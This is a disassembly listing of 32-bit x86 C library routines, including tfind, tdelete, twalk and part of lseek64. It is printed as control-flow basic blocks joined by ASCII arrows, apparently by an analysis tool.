0xb0e7ec8:	add	esp, 0x2c
0xb0e7ecb:	xor	esi, esi
0xb0e7ecd:	pop	ebx
0xb0e7ece:	mov	eax, esi
0xb0e7ed0:	pop	esi
0xb0e7ed1:	pop	edi
0xb0e7ed2:	pop	ebp
0xb0e7ed3:	ret	
None
|
|
|
v
0xb0e7e60:	test	eax, eax
0xb0e7e62:	je	0xb0e7ec8
None
|
|
|
v
0xb0e7ec0:	xor	esi, esi
0xb0e7ec2:	jmp	0xb0e7db0
None
|
|
|
v
0xb0e7d9e:	mov	eax, dword ptr [ebp]
0xb0e7da1:	test	eax, eax
0xb0e7da3:	je	0xb0e7ec0
None
|
|
|
v
0xb0e7d80:	push	ebp
0xb0e7d81:	push	edi
0xb0e7d82:	push	esi
0xb0e7d83:	push	ebx
0xb0e7d84:	sub	esp, 0x2c
0xb0e7d87:	mov	ebp, dword ptr [esp + 0x44]
0xb0e7d8b:	call	0xb1267db
None
|
|
|
v
0xb0e7e13:	mov	ecx, dword ptr [esp + 0x1c]
0xb0e7e17:	lea	eax, dword ptr [esi + 4]
0xb0e7e1a:	add	esi, 8
0xb0e7e1d:	mov	dword ptr [esp + 0x18], ebp
0xb0e7e21:	test	ecx, ecx
0xb0e7e23:	cmovns	eax, esi
0xb0e7e26:	mov	esi, dword ptr [eax]
0xb0e7e28:	test	esi, esi
0xb0e7e2a:	je	0xb0e7eb8
None
|
|
|
v
0xb0e7e64:	mov	ecx, dword ptr [esp + 0x14]
0xb0e7e68:	mov	esi, eax
0xb0e7e6a:	mov	edx, dword ptr [esp + 0x40]
0xb0e7e6e:	mov	dword ptr [ecx], eax
0xb0e7e70:	or	byte ptr [eax + 0xc], 1
0xb0e7e74:	cmp	ebp, ecx
0xb0e7e76:	mov	dword ptr [eax], edx
0xb0e7e78:	mov	dword ptr [eax + 8], 0
0xb0e7e7f:	mov	dword ptr [eax + 4], 0
0xb0e7e86:	je	0xb0e7eac
None
|
|
|
v
0xb0e7eac:	add	esp, 0x2c
0xb0e7eaf:	mov	eax, esi
0xb0e7eb1:	pop	ebx
0xb0e7eb2:	pop	esi
0xb0e7eb3:	pop	edi
0xb0e7eb4:	pop	ebp
0xb0e7eb5:	ret	
None
|
|
|
v
0xb0e7e40:	test	esi, esi
0xb0e7e42:	jne	0xb0e7dd0
None
|
|
|
v
0xb0e7e30:	mov	edx, dword ptr [esp + 0x10]
0xb0e7e34:	mov	ebp, ecx
0xb0e7e36:	mov	dword ptr [esp + 0x10], edi
0xb0e7e3a:	mov	edi, eax
0xb0e7e3c:	mov	dword ptr [esp + 0x14], edx
0xb0e7e40:	test	esi, esi
0xb0e7e42:	jne	0xb0e7dd0
None
|
|
|
v
0xb0e7d90:	add	ebx, 0xc3270
0xb0e7d96:	test	ebp, ebp
0xb0e7d98:	je	0xb0e7ec8
None
|
|
|
v
0xb0e7eb8:	mov	ebp, edi
0xb0e7eba:	mov	edi, ecx
0xb0e7ebc:	mov	ecx, eax
0xb0e7ebe:	jmp	0xb0e7e50
None
|
|
|
v
0xb0e7e88:	mov	eax, dword ptr [esp + 0x18]
0xb0e7e8c:	mov	edx, ebp
0xb0e7e8e:	mov	dword ptr [esp + 0xc], 1
0xb0e7e96:	mov	dword ptr [esp + 4], edi
0xb0e7e9a:	mov	dword ptr [esp + 8], eax
0xb0e7e9e:	mov	eax, dword ptr [esp + 0x10]
0xb0e7ea2:	mov	dword ptr [esp], eax
0xb0e7ea5:	mov	eax, dword ptr [ecx]
0xb0e7ea7:	call	0xb0e7c20
None
|
|
|
v
0xb0e7db0:	xor	eax, eax
0xb0e7db2:	mov	edi, ebp
0xb0e7db4:	mov	dword ptr [esp + 0x18], 0
0xb0e7dbc:	mov	ebp, eax
0xb0e7dbe:	mov	dword ptr [esp + 0x14], 0
0xb0e7dc6:	mov	dword ptr [esp + 0x10], 0
0xb0e7dce:	jmp	0xb0e7e40
None
|
|
|
v
0xb0e7e50:	mov	dword ptr [esp], 0x10
0xb0e7e57:	mov	dword ptr [esp + 0x14], ecx
0xb0e7e5b:	call	0xb0173f0
None
|
|
|
v
0xb0e7da9:	and	byte ptr [eax + 0xc], 0xfe
0xb0e7dad:	mov	esi, dword ptr [ebp]
0xb0e7db0:	xor	eax, eax
0xb0e7db2:	mov	edi, ebp
0xb0e7db4:	mov	dword ptr [esp + 0x18], 0
0xb0e7dbc:	mov	ebp, eax
0xb0e7dbe:	mov	dword ptr [esp + 0x14], 0
0xb0e7dc6:	mov	dword ptr [esp + 0x10], 0
0xb0e7dce:	jmp	0xb0e7e40
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:tfind
TOTAL BLOCKS :8
0xb0e7f18:	add	esp, 0x10
0xb0e7f1b:	xor	eax, eax
0xb0e7f1d:	pop	esi
0xb0e7f1e:	pop	edi
0xb0e7f1f:	pop	ebp
0xb0e7f20:	ret	
None
|
|
|
v
0xb0e7ee0:	push	ebp
0xb0e7ee1:	push	edi
0xb0e7ee2:	push	esi
0xb0e7ee3:	sub	esp, 0x10
0xb0e7ee6:	mov	esi, dword ptr [esp + 0x24]
0xb0e7eea:	mov	ebp, dword ptr [esp + 0x20]
0xb0e7eee:	mov	edi, dword ptr [esp + 0x28]
0xb0e7ef2:	test	esi, esi
0xb0e7ef4:	jne	0xb0e7f12
None
|
|
|
v
0xb0e7ef6:	jmp	0xb0e7f18
None
|
|
|
v
0xb0e7f28:	add	esp, 0x10
0xb0e7f2b:	mov	eax, esi
0xb0e7f2d:	pop	esi
0xb0e7f2e:	pop	edi
0xb0e7f2f:	pop	ebp
0xb0e7f30:	ret	
None
|
|
|
v
0xb0e7f12:	mov	esi, dword ptr [esi]
0xb0e7f14:	test	esi, esi
0xb0e7f16:	jne	0xb0e7ef8
None
|
|
|
v
0xb0e7f07:	lea	edx, dword ptr [esi + 4]
0xb0e7f0a:	add	esi, 8
0xb0e7f0d:	test	eax, eax
0xb0e7f0f:	cmovs	esi, edx
0xb0e7f12:	mov	esi, dword ptr [esi]
0xb0e7f14:	test	esi, esi
0xb0e7f16:	jne	0xb0e7ef8
None
|
|
|
v
0xb0e7ef8:	mov	eax, dword ptr [esi]
0xb0e7efa:	mov	dword ptr [esp], ebp
0xb0e7efd:	mov	dword ptr [esp + 4], eax
0xb0e7f01:	call	edi
None
|
|
|
v
0xb0e7f03:	test	eax, eax
0xb0e7f05:	je	0xb0e7f28
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:tdelete
TOTAL BLOCKS :67
0xb0e7f88:	lea	edx, dword ptr [edi*4]
0xb0e7f8f:	mov	eax, dword ptr [ebp - 0x1c]
0xb0e7f92:	add	edi, 1
0xb0e7f95:	test	ecx, ecx
0xb0e7f97:	mov	dword ptr [eax + edx], esi
0xb0e7f9a:	mov	edx, dword ptr [esi]
0xb0e7f9c:	lea	eax, dword ptr [edx + 4]
0xb0e7f9f:	lea	esi, dword ptr [edx + 8]
0xb0e7fa2:	cmovs	esi, eax
0xb0e7fa5:	mov	eax, dword ptr [esi]
0xb0e7fa7:	test	eax, eax
0xb0e7fa9:	je	0xb0e8020
None
|
|
|
v
0xb0e8158:	mov	ecx, dword ptr [eax + 4]
0xb0e815b:	test	ecx, ecx
0xb0e815d:	je	0xb0e8198
None
|
|
|
v
0xb0e8204:	movzx	edi, byte ptr [esi + 0xc]
0xb0e8208:	movzx	eax, byte ptr [ecx + 0xc]
0xb0e820c:	and	edi, 1
0xb0e820f:	and	eax, 0xfffffffe
0xb0e8212:	or	eax, edi
0xb0e8214:	mov	byte ptr [ecx + 0xc], al
0xb0e8217:	mov	eax, dword ptr [ecx + 4]
0xb0e821a:	mov	dword ptr [esi + 8], eax
0xb0e821d:	mov	eax, dword ptr [ecx + 8]
0xb0e8220:	mov	dword ptr [edx + 4], eax
0xb0e8223:	mov	eax, dword ptr [ebp - 0x1c]
0xb0e8226:	mov	dword ptr [ecx + 8], edx
0xb0e8229:	mov	dword ptr [ecx + 4], esi
0xb0e822c:	mov	dword ptr [eax], ecx
0xb0e822e:	and	byte ptr [esi + 0xc], 0xfe
0xb0e8232:	jmp	0xb0e8141
None
|
|
|
v
0xb0e8378:	jmp	0xb0e8141
None
|
|
|
v
0xb0e806b:	mov	ecx, dword ptr [ebp - 0x28]
0xb0e806e:	mov	esi, dword ptr [ebp - 0x24]
0xb0e8071:	cmp	esi, ecx
0xb0e8073:	je	0xb0e8079
None
|
|
|
v
0xb0e81bb:	and	eax, 0xfffffffe
0xb0e81be:	mov	byte ptr [edx + 0xc], al
0xb0e81c1:	mov	eax, dword ptr [edx + 4]
0xb0e81c4:	or	byte ptr [esi + 0xc], 1
0xb0e81c8:	add	dword ptr [ebp - 0x20], 1
0xb0e81cc:	mov	dword ptr [esi + 8], eax
0xb0e81cf:	mov	eax, dword ptr [ebp - 0x1c]
0xb0e81d2:	mov	dword ptr [edx + 4], esi
0xb0e81d5:	mov	dword ptr [edi], edx
0xb0e81d7:	lea	edi, dword ptr [edx + 4]
0xb0e81da:	mov	edx, dword ptr [esi + 8]
0xb0e81dd:	mov	dword ptr [eax + ecx + 4], edi
0xb0e81e1:	mov	ecx, dword ptr [edx + 4]
0xb0e81e4:	test	ecx, ecx
0xb0e81e6:	je	0xb0e8238
None
|
|
|
v
0xb0e8113:	movzx	ecx, byte ptr [esi + 0xc]
0xb0e8117:	movzx	edi, byte ptr [edx + 0xc]
0xb0e811b:	and	ecx, 1
0xb0e811e:	and	edi, 0xfffffffe
0xb0e8121:	or	ecx, edi
0xb0e8123:	mov	byte ptr [edx + 0xc], cl
0xb0e8126:	mov	ecx, dword ptr [edx + 8]
0xb0e8129:	mov	dword ptr [esi + 4], ecx
0xb0e812c:	mov	ecx, dword ptr [edx + 4]
0xb0e812f:	mov	dword ptr [eax + 8], ecx
0xb0e8132:	mov	dword ptr [edx + 4], eax
0xb0e8135:	mov	eax, dword ptr [ebp - 0x1c]
0xb0e8138:	mov	dword ptr [edx + 8], esi
0xb0e813b:	mov	dword ptr [eax], edx
0xb0e813d:	and	byte ptr [esi + 0xc], 0xfe
0xb0e8141:	mov	eax, dword ptr [ebp - 0x24]
0xb0e8144:	mov	dword ptr [esp], eax
0xb0e8147:	call	0xb017470
None
|
|
|
v
0xb0e82a8:	test	cl, cl
0xb0e82aa:	jne	0xb0e8358
None
|
|
|
v
0xb0e80c1:	movzx	edx, byte ptr [eax + 0xc]
0xb0e80c5:	test	dl, 1
0xb0e80c8:	je	0xb0e80f0
None
|
|
|
v
0xb0e814c:	mov	eax, dword ptr [ebp - 0x2c]
0xb0e814f:	lea	esp, dword ptr [ebp - 0xc]
0xb0e8152:	pop	ebx
0xb0e8153:	pop	esi
0xb0e8154:	pop	edi
0xb0e8155:	pop	ebp
0xb0e8156:	ret	
None
|
|
|
v
0xb0e81a8:	and	byte ptr [edx + 0xc], 0xfe
0xb0e81ac:	jmp	0xb0e8141
None
|
|
|
v
0xb0e81e8:	test	byte ptr [ecx + 0xc], 1
0xb0e81ec:	je	0xb0e8238
None
|
|
|
v
0xb0e80f7:	test	byte ptr [edx + 0xc], 1
0xb0e80fb:	je	0xb0e8158
None
|
|
|
v
0xb0e819c:	sub	dword ptr [ebp - 0x20], 1
0xb0e81a0:	mov	edx, esi
0xb0e81a2:	jne	0xb0e8091
None
|
|
|
v
0xb0e8066:	mov	eax, dword ptr [ebp - 0x34]
0xb0e8069:	mov	dword ptr [eax], edx
0xb0e806b:	mov	ecx, dword ptr [ebp - 0x28]
0xb0e806e:	mov	esi, dword ptr [ebp - 0x24]
0xb0e8071:	cmp	esi, ecx
0xb0e8073:	je	0xb0e8079
None
|
|
|
v
0xb0e7fc6:	cmp	edi, dword ptr [ebp - 0x24]
0xb0e7fc9:	jne	0xb0e7f88
None
|
|
|
v
0xb0e829d:	mov	dword ptr [eax + 4], edx
0xb0e82a0:	jmp	0xb0e806b
None
|
|
|
v
0xb0e82d0:	mov	eax, dword ptr [ebp - 0x1c]
0xb0e82d3:	add	ecx, 1
0xb0e82d6:	mov	edx, dword ptr [ebp + 0xc]
0xb0e82d9:	mov	dword ptr [eax + edi], edx
0xb0e82dc:	mov	eax, dword ptr [esi + 4]
0xb0e82df:	add	edi, 4
0xb0e82e2:	test	eax, eax
0xb0e82e4:	je	0xb0e8338
None
|
|
|
v
0xb0e7fbd:	mov	edx, dword ptr [ebp - 0x20]
0xb0e7fc0:	test	eax, eax
0xb0e7fc2:	mov	ecx, eax
0xb0e7fc4:	je	0xb0e8030
None
|
|
|
v
0xb0e80ca:	and	edx, 0xfffffffe
0xb0e80cd:	mov	byte ptr [eax + 0xc], dl
0xb0e80d0:	mov	edx, dword ptr [eax + 8]
0xb0e80d3:	or	byte ptr [esi + 0xc], 1
0xb0e80d7:	add	dword ptr [ebp - 0x20], 1
0xb0e80db:	mov	dword ptr [esi + 4], edx
0xb0e80de:	mov	dword ptr [eax + 8], esi
0xb0e80e1:	mov	dword ptr [edi], eax
0xb0e80e3:	lea	edi, dword ptr [eax + 8]
0xb0e80e6:	mov	eax, dword ptr [ebp - 0x1c]
0xb0e80e9:	mov	dword ptr [eax + ecx + 4], edi
0xb0e80ed:	mov	eax, dword ptr [esi + 4]
0xb0e80f0:	mov	edx, dword ptr [eax + 8]
0xb0e80f3:	test	edx, edx
0xb0e80f5:	je	0xb0e8158
None
|
|
|
v
0xb0e8050:	test	cl, cl
0xb0e8052:	jne	0xb0e8358
None
|
|
|
v
0xb0e8338:	mov	edi, ecx
0xb0e833a:	mov	edx, dword ptr [esi + 8]
0xb0e833d:	mov	dword ptr [ebp - 0x24], esi
0xb0e8340:	jmp	0xb0e805e
None
|
|
|
v
0xb0e8020:	lea	esp, dword ptr [ebp - 0xc]
0xb0e8023:	xor	eax, eax
0xb0e8025:	pop	ebx
0xb0e8026:	pop	esi
0xb0e8027:	pop	edi
0xb0e8028:	pop	ebp
0xb0e8029:	ret	
None
|
|
|
v
0xb0e832d:	mov	ecx, dword ptr [ebp - 0x30]
0xb0e8330:	mov	dword ptr [ebp - 0x1c], eax
0xb0e8333:	jmp	0xb0e82d0
None
|
|
|
v
0xb0e800e:	mov	ecx, dword ptr [ebp - 0x28]
0xb0e8011:	mov	edx, dword ptr [ebp - 0x20]
0xb0e8014:	mov	dword ptr [ebp - 0x1c], eax
0xb0e8017:	jmp	0xb0e7f8f
None
|
|
|
v
0xb0e82f4:	cmp	ecx, dword ptr [ebp - 0x24]
0xb0e82f7:	jne	0xb0e82d0
None
|
|
|
v
0xb0e7f78:	xor	edi, edi
0xb0e7f7a:	mov	dword ptr [ebp - 0x24], 0x28
0xb0e7f81:	jmp	0xb0e7fab
None
|
|
|
v
0xb0e81fb:	mov	eax, dword ptr [ebp - 0x20]
0xb0e81fe:	test	byte ptr [eax + 0xc], 1
0xb0e8202:	jne	0xb0e8253
None
|
|
|
v
0xb0e810a:	mov	edi, dword ptr [ebp - 0x20]
0xb0e810d:	test	byte ptr [edi + 0xc], 1
0xb0e8111:	jne	0xb0e816b
None
|
|
|
v
0xb0e82e6:	lea	edx, dword ptr [esi + 4]
0xb0e82e9:	mov	esi, dword ptr [ebp - 0x20]
0xb0e82ec:	mov	dword ptr [ebp - 0x20], edx
0xb0e82ef:	mov	dword ptr [ebp + 0xc], esi
0xb0e82f2:	mov	esi, eax
0xb0e82f4:	cmp	ecx, dword ptr [ebp - 0x24]
0xb0e82f7:	jne	0xb0e82d0
None
|
|
|
v
0xb0e7f40:	push	ebp
0xb0e7f41:	mov	ebp, esp
0xb0e7f43:	push	edi
0xb0e7f44:	push	esi
0xb0e7f45:	push	ebx
0xb0e7f46:	sub	esp, 0xec
0xb0e7f4c:	mov	esi, dword ptr [ebp + 0xc]
0xb0e7f4f:	lea	eax, dword ptr [esp + 0x1b]
0xb0e7f53:	and	eax, 0xfffffff0
0xb0e7f56:	call	0xb1267db
None
|
|
|
v
0xb0e8165:	mov	dword ptr [ebp - 0x1c], edi
0xb0e8168:	mov	dword ptr [ebp - 0x20], ecx
0xb0e816b:	movzx	edi, byte ptr [esi + 0xc]
0xb0e816f:	movzx	ecx, byte ptr [eax + 0xc]
0xb0e8173:	and	edi, 1
0xb0e8176:	and	ecx, 0xfffffffe
0xb0e8179:	or	edi, ecx
0xb0e817b:	mov	ecx, edi
0xb0e817d:	mov	edi, dword ptr [ebp - 0x20]
0xb0e8180:	mov	byte ptr [eax + 0xc], cl
0xb0e8183:	and	byte ptr [esi + 0xc], 0xfe
0xb0e8187:	and	byte ptr [edi + 0xc], 0xfe
0xb0e818b:	mov	edi, dword ptr [ebp - 0x1c]
0xb0e818e:	mov	dword ptr [esi + 4], edx
0xb0e8191:	mov	dword ptr [eax + 8], esi
0xb0e8194:	mov	dword ptr [edi], eax
0xb0e8196:	jmp	0xb0e8141
None
|
|
|
v
0xb0e8253:	movzx	edi, byte ptr [esi + 0xc]
0xb0e8257:	movzx	eax, byte ptr [edx + 0xc]
0xb0e825b:	and	edi, 1
0xb0e825e:	and	eax, 0xfffffffe
0xb0e8261:	or	edi, eax
0xb0e8263:	mov	eax, edi
0xb0e8265:	mov	byte ptr [edx + 0xc], al
0xb0e8268:	mov	eax, dword ptr [ebp - 0x20]
0xb0e826b:	and	byte ptr [esi + 0xc], 0xfe
0xb0e826f:	and	byte ptr [eax + 0xc], 0xfe
0xb0e8273:	mov	eax, dword ptr [ebp - 0x1c]
0xb0e8276:	mov	dword ptr [esi + 8], ecx
0xb0e8279:	mov	dword ptr [edx + 4], esi
0xb0e827c:	mov	dword ptr [eax], edx
0xb0e827e:	jmp	0xb0e8141
None
|
|
|
v
0xb0e8288:	mov	eax, dword ptr [ebp - 0x1c]
0xb0e828b:	mov	ecx, dword ptr [ebp - 0x24]
0xb0e828e:	mov	eax, dword ptr [eax + edi*4 - 4]
0xb0e8292:	mov	eax, dword ptr [eax]
0xb0e8294:	cmp	dword ptr [eax + 8], ecx
0xb0e8297:	je	0xb0e8368
None
|
|
|
v
0xb0e8370:	test	edx, edx
0xb0e8372:	jne	0xb0e81a8
None
|
|
|
v
0xb0e82b0:	mov	ecx, dword ptr [ebp - 0x28]
0xb0e82b3:	mov	dword ptr [ebp + 0xc], esi
0xb0e82b6:	mov	esi, eax
0xb0e82b8:	add	ecx, 8
0xb0e82bb:	mov	dword ptr [ebp - 0x20], ecx
0xb0e82be:	lea	ecx, dword ptr [edi*4]
0xb0e82c5:	mov	edx, ecx
0xb0e82c7:	mov	ecx, edi
0xb0e82c9:	mov	edi, edx
0xb0e82cb:	jmp	0xb0e82f4
None
|
|
|
v
0xb0e805e:	test	edi, edi
0xb0e8060:	jne	0xb0e8288
None
|
|
|
v
0xb0e8348:	or	byte ptr [edx + 0xc], 1
0xb0e834c:	jmp	0xb0e819c
None
|
|
|
v
0xb0e8079:	mov	eax, dword ptr [ebp - 0x24]
0xb0e807c:	test	byte ptr [eax + 0xc], 1
0xb0e8080:	jne	0xb0e8141
None
|
|
|
v
0xb0e7f5b:	add	ebx, 0xc30a5
0xb0e7f61:	test	esi, esi
0xb0e7f63:	mov	dword ptr [ebp - 0x1c], eax
0xb0e7f66:	je	0xb0e8020
None
|
|
|
v
0xb0e8358:	mov	edx, eax
0xb0e835a:	mov	eax, dword ptr [ebp - 0x28]
0xb0e835d:	mov	dword ptr [ebp - 0x24], eax
0xb0e8360:	jmp	0xb0e805e
None
|
|
|
v
0xb0e809f:	mov	eax, dword ptr [ebp - 0x20]
0xb0e80a2:	mov	edi, dword ptr [ebp - 0x1c]
0xb0e80a5:	add	eax, 0x3fffffff
0xb0e80aa:	mov	edi, dword ptr [edi + eax*4]
0xb0e80ad:	lea	ecx, dword ptr [eax*4]
0xb0e80b4:	mov	esi, dword ptr [edi]
0xb0e80b6:	mov	eax, dword ptr [esi + 4]
0xb0e80b9:	cmp	eax, edx
0xb0e80bb:	je	0xb0e81b0
None
|
|
|
v
0xb0e81e1:	mov	ecx, dword ptr [edx + 4]
0xb0e81e4:	test	ecx, ecx
0xb0e81e6:	je	0xb0e8238
None
|
|
|
v
0xb0e8075:	mov	eax, dword ptr [esi]
0xb0e8077:	mov	dword ptr [ecx], eax
0xb0e8079:	mov	eax, dword ptr [ebp - 0x24]
0xb0e807c:	test	byte ptr [eax + 0xc], 1
0xb0e8080:	jne	0xb0e8141
None
|
|
|
v
0xb0e7fab:	mov	eax, dword ptr [eax]
0xb0e7fad:	mov	dword ptr [ebp - 0x20], edx
0xb0e7fb0:	mov	dword ptr [esp + 4], eax
0xb0e7fb4:	mov	eax, dword ptr [ebp + 8]
0xb0e7fb7:	mov	dword ptr [esp], eax
0xb0e7fba:	call	dword ptr [ebp + 0x10]
None
|
|
|
v
0xb0e8141:	mov	eax, dword ptr [ebp - 0x24]
0xb0e8144:	mov	dword ptr [esp], eax
0xb0e8147:	call	0xb017470
None
|
|
|
v
0xb0e8091:	test	edx, edx
0xb0e8093:	je	0xb0e809f
None
|
|
|
v
0xb0e824d:	mov	dword ptr [ebp - 0x1c], edi
0xb0e8250:	mov	dword ptr [ebp - 0x20], eax
0xb0e8253:	movzx	edi, byte ptr [esi + 0xc]
0xb0e8257:	movzx	eax, byte ptr [edx + 0xc]
0xb0e825b:	and	edi, 1
0xb0e825e:	and	eax, 0xfffffffe
0xb0e8261:	or	edi, eax
0xb0e8263:	mov	eax, edi
0xb0e8265:	mov	byte ptr [edx + 0xc], al
0xb0e8268:	mov	eax, dword ptr [ebp - 0x20]
0xb0e826b:	and	byte ptr [esi + 0xc], 0xfe
0xb0e826f:	and	byte ptr [eax + 0xc], 0xfe
0xb0e8273:	mov	eax, dword ptr [ebp - 0x1c]
0xb0e8276:	mov	dword ptr [esi + 8], ecx
0xb0e8279:	mov	dword ptr [edx + 4], esi
0xb0e827c:	mov	dword ptr [eax], edx
0xb0e827e:	jmp	0xb0e8141
None
|
|
|
v
0xb0e81b0:	mov	edx, dword ptr [esi + 8]
0xb0e81b3:	movzx	eax, byte ptr [edx + 0xc]
0xb0e81b7:	test	al, 1
0xb0e81b9:	je	0xb0e81e1
None
|
|
|
v
0xb0e8086:	test	edi, edi
0xb0e8088:	je	0xb0e8370
None
|
|
|
v
0xb0e8243:	test	byte ptr [eax + 0xc], 1
0xb0e8247:	je	0xb0e8348
None
|
|
|
v
0xb0e7f6c:	mov	eax, dword ptr [esi]
0xb0e7f6e:	test	eax, eax
0xb0e7f70:	mov	edx, eax
0xb0e7f72:	je	0xb0e8020
None
|
|
|
v
0xb0e808e:	mov	dword ptr [ebp - 0x20], edi
0xb0e8091:	test	edx, edx
0xb0e8093:	je	0xb0e809f
None
|
|
|
v
0xb0e7fcb:	lea	eax, dword ptr [edi + 0x14]
0xb0e7fce:	xor	edx, edx
0xb0e7fd0:	mov	dword ptr [ebp - 0x24], eax
0xb0e7fd3:	shl	eax, 2
0xb0e7fd6:	mov	dword ptr [ebp - 0x20], eax
0xb0e7fd9:	add	eax, 0x1e
0xb0e7fdc:	mov	dword ptr [ebp - 0x28], ecx
0xb0e7fdf:	mov	ecx, 0x10
0xb0e7fe4:	div	ecx
0xb0e7fe6:	mov	ecx, dword ptr [ebp - 0x20]
0xb0e7fe9:	lea	edx, dword ptr [ecx - 0x50]
0xb0e7fec:	mov	ecx, dword ptr [ebp - 0x1c]
0xb0e7fef:	mov	dword ptr [ebp - 0x20], edx
0xb0e7ff2:	shl	eax, 4
0xb0e7ff5:	sub	esp, eax
0xb0e7ff7:	lea	eax, dword ptr [esp + 0x1b]
0xb0e7ffb:	and	eax, 0xfffffff0
0xb0e7ffe:	mov	dword ptr [esp + 8], edx
0xb0e8002:	mov	dword ptr [esp + 4], ecx
0xb0e8006:	mov	dword ptr [esp], eax
0xb0e8009:	call	0xb07d0b0
None
|
|
|
v
0xb0e81ee:	mov	eax, dword ptr [edx + 8]
0xb0e81f1:	mov	dword ptr [ebp - 0x1c], edi
0xb0e81f4:	test	eax, eax
0xb0e81f6:	mov	dword ptr [ebp - 0x20], eax
0xb0e81f9:	je	0xb0e8204
None
|
|
|
v
0xb0e8198:	or	byte ptr [eax + 0xc], 1
0xb0e819c:	sub	dword ptr [ebp - 0x20], 1
0xb0e81a0:	mov	edx, esi
0xb0e81a2:	jne	0xb0e8091
None
|
|
|
v
0xb0e7f8f:	mov	eax, dword ptr [ebp - 0x1c]
0xb0e7f92:	add	edi, 1
0xb0e7f95:	test	ecx, ecx
0xb0e7f97:	mov	dword ptr [eax + edx], esi
0xb0e7f9a:	mov	edx, dword ptr [esi]
0xb0e7f9c:	lea	eax, dword ptr [edx + 4]
0xb0e7f9f:	lea	esi, dword ptr [edx + 8]
0xb0e7fa2:	cmovs	esi, eax
0xb0e7fa5:	mov	eax, dword ptr [esi]
0xb0e7fa7:	test	eax, eax
0xb0e7fa9:	je	0xb0e8020
None
|
|
|
v
0xb0e8058:	mov	eax, dword ptr [ebp - 0x28]
0xb0e805b:	mov	dword ptr [ebp - 0x24], eax
0xb0e805e:	test	edi, edi
0xb0e8060:	jne	0xb0e8288
None
|
|
|
v
0xb0e8368:	mov	dword ptr [eax + 8], edx
0xb0e836b:	jmp	0xb0e806b
None
|
|
|
v
0xb0e8030:	mov	eax, dword ptr [esi]
0xb0e8032:	mov	dword ptr [ebp - 0x2c], edx
0xb0e8035:	mov	dword ptr [ebp - 0x34], esi
0xb0e8038:	mov	ecx, eax
0xb0e803a:	mov	edx, dword ptr [ecx + 4]
0xb0e803d:	mov	dword ptr [ebp - 0x28], eax
0xb0e8040:	mov	eax, dword ptr [eax + 8]
0xb0e8043:	test	edx, edx
0xb0e8045:	sete	cl
0xb0e8048:	test	eax, eax
0xb0e804a:	jne	0xb0e82a8
None
|
|
|
v
0xb0e8095:	test	byte ptr [edx + 0xc], 1
0xb0e8099:	jne	0xb0e81a8
None
|
|
|
v
0xb0e80fd:	mov	dword ptr [ebp - 0x1c], edi
0xb0e8100:	mov	edi, dword ptr [eax + 4]
0xb0e8103:	test	edi, edi
0xb0e8105:	mov	dword ptr [ebp - 0x20], edi
0xb0e8108:	je	0xb0e8113
None
|
|
|
v
0xb0e82f9:	lea	eax, dword ptr [ecx + 0x14]
0xb0e82fc:	xor	edx, edx
0xb0e82fe:	mov	dword ptr [ebp - 0x30], ecx
0xb0e8301:	mov	ecx, 0x10
0xb0e8306:	mov	dword ptr [ebp - 0x24], eax
0xb0e8309:	lea	eax, dword ptr [edi + 0x6e]
0xb0e830c:	div	ecx
0xb0e830e:	mov	ecx, dword ptr [ebp - 0x1c]
0xb0e8311:	shl	eax, 4
0xb0e8314:	sub	esp, eax
0xb0e8316:	lea	eax, dword ptr [esp + 0x1b]
0xb0e831a:	and	eax, 0xfffffff0
0xb0e831d:	mov	dword ptr [esp + 4], ecx
0xb0e8321:	mov	dword ptr [esp + 8], edi
0xb0e8325:	mov	dword ptr [esp], eax
0xb0e8328:	call	0xb07d0b0
None
|
|
|
v
0xb0e815f:	test	byte ptr [ecx + 0xc], 1
0xb0e8163:	je	0xb0e8198
None
|
|
|
v
0xb0e8238:	mov	eax, dword ptr [edx + 8]
0xb0e823b:	test	eax, eax
0xb0e823d:	je	0xb0e8348
None
|
|
|
v
0xb0e80f0:	mov	edx, dword ptr [eax + 8]
0xb0e80f3:	test	edx, edx
0xb0e80f5:	je	0xb0e8158
None
|
|
|
v
0xb0e816b:	movzx	edi, byte ptr [esi + 0xc]
0xb0e816f:	movzx	ecx, byte ptr [eax + 0xc]
0xb0e8173:	and	edi, 1
0xb0e8176:	and	ecx, 0xfffffffe
0xb0e8179:	or	edi, ecx
0xb0e817b:	mov	ecx, edi
0xb0e817d:	mov	edi, dword ptr [ebp - 0x20]
0xb0e8180:	mov	byte ptr [eax + 0xc], cl
0xb0e8183:	and	byte ptr [esi + 0xc], 0xfe
0xb0e8187:	and	byte ptr [edi + 0xc], 0xfe
0xb0e818b:	mov	edi, dword ptr [ebp - 0x1c]
0xb0e818e:	mov	dword ptr [esi + 4], edx
0xb0e8191:	mov	dword ptr [eax + 8], esi
0xb0e8194:	mov	dword ptr [edi], eax
0xb0e8196:	jmp	0xb0e8141
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:twalk
TOTAL BLOCKS :4
0xb0e838c:	ret	
None
|
|
|
v
0xb0e8394:	xor	ecx, ecx
0xb0e8396:	jmp	0xb0e7b40
None
|
|
|
v
0xb0e8390:	test	edx, edx
0xb0e8392:	je	0xb0e838c
None
|
|
|
v
0xb0e8380:	mov	eax, dword ptr [esp + 4]
0xb0e8384:	mov	edx, dword ptr [esp + 8]
0xb0e8388:	test	eax, eax
0xb0e838a:	jne	0xb0e8390
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:lseek64
TOTAL BLOCKS :7
0xb0ec037:	test	ebp, ebp
0xb0ec039:	jne	0xb0ec060
None
|
|
|
v
0xb0ec004:	add	ebx, 0xbeffc
0xb0ec00a:	mov	ecx, dword ptr [esp + 0x30]
0xb0ec00e:	mov	edx, dword ptr [esp + 0x2c]
0xb0ec012:	mov	edi, dword ptr [esp + 0x34]
0xb0ec016:	mov	eax, ebp
0xb0ec018:	mov	dword ptr [esp + 4], ebx
0xb0ec01c:	mov	ebx, eax
0xb0ec01e:	mov	eax, 0x8c
0xb0ec023:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0ec04b:	mov	eax, dword ptr [ebx - 0xdc]
0xb0ec051:	neg	ebp
0xb0ec053:	mov	edx, dword ptr gs:[0]
0xb0ec05a:	mov	dword ptr [edx + eax], ebp
0xb0ec05d:	or	eax, 0xffffffff
0xb0ec060:	add	esp, 0x14
0xb0ec063:	cdq	
0xb0ec064:	pop	ebx
0xb0ec065:	pop	esi
0xb0ec066:	pop	edi
